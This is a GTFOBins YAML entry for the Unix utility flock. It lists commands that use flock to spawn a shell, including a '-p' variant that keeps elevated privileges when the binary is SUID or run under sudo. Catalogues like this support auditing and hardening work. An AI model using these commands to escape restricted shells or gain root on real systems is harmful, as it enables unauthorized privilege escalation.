<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/flock -->
---
functions:
  shell:
  - code: |-
      flock -u / /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          flock -u / /bin/sh -p
        shell: false
      unprivileged:
...
